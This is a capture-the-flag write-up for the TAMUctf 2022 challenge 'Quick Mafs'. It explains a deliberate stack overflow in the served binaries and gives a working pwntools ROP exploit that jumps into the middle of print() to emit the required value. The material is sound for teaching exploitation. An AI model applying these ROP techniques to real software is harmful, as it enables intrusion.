## Quick Mafs

was an pwn challenge from TAMUctf 2022.

It's a type of challenge that is called automatic exploit generator, a mix of coding and pwning challenge.

A server where we connect send us a serie of elf binaries, (as hexadecimal dump).

We have to quickly analyze them and exploit them. That's a classic type of challenge.

so how to start..?

well we will first download some of the binaries sent by the server, save them, and analyze them.

Let's see by how much they vary, and reverse them.

In the case of this challenge the authour told us there is a print function function to call, and each time indicate us a value to put in `eax` before calling print.

That's the condition to achieve for each binaries, and there will be five of them.

let's reverse somes of the provided binaries, there is the `vuln()` function:

![](https://github.com/nobodyisnobody/write-ups/raw/main/TamuCTF.2022/pwn/Quick.Mafs/pics/reverse1.png)

you can see in the vuln function,

that there is an intended buffer overflow of 0x2000 bytes, read directly at `rsp` address.

where we will put our ROP payload.

now let's have a look at `print()` function:

![](https://github.com/nobodyisnobody/write-ups/raw/main/TamuCTF.2022/pwn/Quick.Mafs/pics/reverse2.png)

we can see in the print function that the `eax` value is saved on stack,

then it's two first lsb (16bit value so), are written to stdout as a raw 16 bit value..

then the program exits..

The problem is that there are no simple gadget to set `eax` to the desired value..

instead, each binaries provided by the servers, included hundreds or arithmetical gadgets, based on `ax`, and the various values pointed by `rbx` register

The intended solution seems to be to use a sort of solver like z3, or angr eventually, to set `eax` to the given values,

by using theses arithmetic gadgets...

That's probably possible, z3 can do "miracles",  but is too much complicated...

so instead of this we will use a serie of gadgets 

so set first `rdx` to 2,  to output the 2 bytes containing the required value, but without passing via the `eax` register.

we will put the given value to be returned , at the end of our payload (on stack so),

then we will jump in the middle of the `print()` function, precisely at the address `0x40179b`

![](https://github.com/nobodyisnobody/write-ups/raw/main/TamuCTF.2022/pwn/Quick.Mafs/pics/gadget.png)

like this, we will output directly the 2 last bytes to stdout...as required...

so here is the exploit


```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*
from pwn import *
import binascii

context.update(arch="amd64", os="linux")
context.log_level = 'info'

p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")

for binary in range(5):
  p.recvuntil('rax = ',drop=True)
  rax = int(p.recvuntil('\n',drop=True),16)
#  instructions = p.recvline() # the server will give you instructions as to what your exploit should do
#  print(instructions)
  temp = p.recvuntil('\n',drop=True)
  elf = binascii.unhexlify(temp)
  with open("elf", "wb") as file:
    file.write(elf)

  exe = ELF('./elf')

  gadget3 = 0x000000000040122c # pop rdx ; add byte ptr [rsi + 0x2b], etc...

  # we will use this code as a gadget indeed
  '''
   0x000000000040179b <+12>:    mov    rsi,rsp
   0x000000000040179e <+15>:    mov    rdi,0x1
   0x00000000004017a5 <+22>:    mov    rax,0x1
   0x00000000004017ac <+29>:    syscall
   0x00000000004017ae <+31>:    mov    rdi,0x0
   0x00000000004017b5 <+38>:    mov    rax,0x3c
   0x00000000004017bc <+45>:    syscall
   0x00000000004017be <+47>:    nop
   0x00000000004017bf <+48>:    pop    rbp
   0x00000000004017c0 <+49>:    ret
  '''
  # set rdx = 2
  prelude = p64(0xdeadbeef)+p64(gadget3)+p64(2)
  prelude += p64(0x000000000040179b)
  # convert payload to hexa string and wanted value
  payload = binascii.hexlify(prelude + p16(rax))
  p.sendline(payload)
p.interactive()
```

*nobodyisnobody still pwning things...*
